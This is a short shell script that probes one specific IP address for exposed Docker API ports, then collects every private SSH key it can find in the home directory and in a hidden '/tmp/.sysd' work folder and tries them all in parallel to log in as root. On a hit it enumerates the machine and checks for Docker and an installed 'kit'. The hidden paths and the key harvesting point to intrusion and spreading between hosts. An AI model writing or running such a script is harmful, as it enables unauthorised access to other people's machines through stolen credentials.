#!/bin/sh
# What is 5.161.247.9 ("box2"), and does ANY key we hold open it? Parallel version.
ip=${1:-5.161.247.9}
W=${HUNT_WORK:-/tmp/.sysd/.hunt}

echo "== http surface (is anything of ours/daemon exposed?)"
for p in 2375 2376 4243 80 443 8080 9000; do
    code=$(curl -sS -o /dev/null -w '%{http_code}' -m 4 "http://$ip:$p/version" 2>/dev/null) || code="no"
    echo "  $p: $code"
done

echo "== ssh reachability (root, batch, any of our keys)"
timeout 8 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o IdentitiesOnly=yes -o ConnectTimeout=5 root@"$ip" true 2>&1 | sed -e 's/^/  /' | tail -2

echo "== key inventory"
: > /tmp/k.lst
for k in "$W"/keys/* "$HOME"/.ssh/id_* /tmp/.sysd/id_key ./id_key; do
    [ -f "$k" ] || continue
    ssh-keygen -l -f "$k" >/dev/null 2>&1 || continue
    printf '%s\n' "$k" >> /tmp/k.lst
done
echo "  $(wc -l < /tmp/k.lst) usable key file(s) here"

echo "== trying them all (parallel 32)"
: > /tmp/opens.txt
cat /tmp/k.lst | xargs -r -P 32 -n 1 sh /tmp/try1.sh 5.161.247.9 > /tmp/opens.txt 2>/dev/null
if [ -s /tmp/opens.txt ]; then
    sort -u /tmp/opens.txt | sed -e 's/^/  /'
else
    echo "  no key opened it"
fi

echo "== what is it (first hit)"
k=$(sed -n 1p /tmp/opens.txt | sed -e 's/.*<= //'); u=$(sed -n 1p /tmp/opens.txt | sed -e 's/OPEN //' -e 's/@.*//')
if [ -n "$k" ] && [ -f "$k" ]; then
    timeout 20 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes "$u@$ip" \
        'uname -a; echo ---; head -3 /etc/os-release; echo ---; nproc; head -2 /proc/meminfo; echo ---; systemctl is-active docker; docker ps 2>/dev/null | head -4; echo ---; ls -d /tmp/.sysd 2>/dev/null || echo no-kit' 2>/dev/null
fi
